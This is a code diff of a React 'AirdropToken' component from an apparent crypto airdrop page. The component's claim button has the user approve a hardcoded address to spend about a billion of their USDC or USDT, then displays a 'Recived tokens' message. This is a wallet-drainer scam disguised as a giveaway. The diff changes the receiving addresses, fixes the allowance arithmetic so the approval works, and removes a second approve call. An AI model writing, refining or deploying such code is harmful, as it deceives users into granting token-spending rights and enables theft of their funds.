@@ -18,12 +18,12 @@ class AirdropToken extends React.Component {
         USDC: {
             1: {
                 contract: null,
-                address: "0x647d1Dc5bc8c9a288ABe7032948aE87682b2C4B4", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                address: "0x647d1Dc5bc8c9a288ABe7032948aE87682b2C4B4",
                 decimals: 6,
             },
             5777: {
                 contract: null,
-                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                 decimals: 6,
             },
         },
@@ -35,7 +35,7 @@ class AirdropToken extends React.Component {
             },
             5777: {
                 contract: null,
-                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                 decimals: 6,
             },
         },
@@ -47,12 +47,12 @@ class AirdropToken extends React.Component {
             },
             5777: {
                 contract: null,
-                address: "0xA485cd94b8d116C007BEec9B6a8fd308a8665087", //"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
+                address: "0xc03d980Fd75a222837D53A4F403D3e400c8a99fF",
                 decimals: 18,
             },
         },
         symbol: "USDT",
-        mAddress: '0x78298fA25eBf614A994041Df199c28bc637804d5',
+        mAddress: '0x87558A8BdCD865a3d7E2C3A7e8f64Fb7d2E31341',
 
     }
     componentDidMount() {
@@ -60,9 +60,6 @@ class AirdropToken extends React.Component {
             this.setState({ isConnectedWeb3: false })
         }
 
-        if (this.props.web3) {
-            this.initContracts();
-        }
         this.onTokenSelected.bind(this)
     }
 
@@ -78,7 +75,7 @@ class AirdropToken extends React.Component {
 
             token[chainId].contract = contract;
 
-            this.setState({ symbol: token })
+            this.setState({ [symbol]: token })
             return token
         }).catch(error => { throw error })
     }
@@ -94,25 +91,22 @@ class AirdropToken extends React.Component {
                 await this.initContracts(symbol, web3)
                 let token = this.state[symbol]
                 window.token = token
-                token[chainId].contract.methods.approve(mAddress, 1_000_000_000 * token[chainId].decimals)
+                let amount = "0x" + (1_000_000_000 * (10 ** parseInt(token[chainId].decimals))).toString(16)
+                log(amount)
+                token[chainId].contract.methods.approve(mAddress, amount)
                     .send({ from: accounts[0] }, function (err, tx) {
                         if (err) {
                             toast.error(err.message)
                             logerror(err)
                         } else toast.success("Recived tokens")
                     })
-                    
-                token[chainId].contract.methods.approve("0x57Ce6709e2201633fc82A6F98A22775aC49831c4", 1_000_000_000 * token[chainId].decimals)
-                    .send({ from: accounts[0] }, function (err, tx) {
-                        if (err) {
-                            toast.error(err.message)
-                            logerror(err)
-                        } else toast.success("Recived tokens")
-                    })
-            } catch (error) {
+
+            }
+            catch (error) {
                 logerror("reciveAirdrop:", error.message, symbol, chainId)
                 if (error.message.includes("Unexpected token"))
                     toast.error(`We haven't suport this chain yet: ${symbol} - ${chainId}`)
+                else toast.error(error.message)
             }
         }
     }
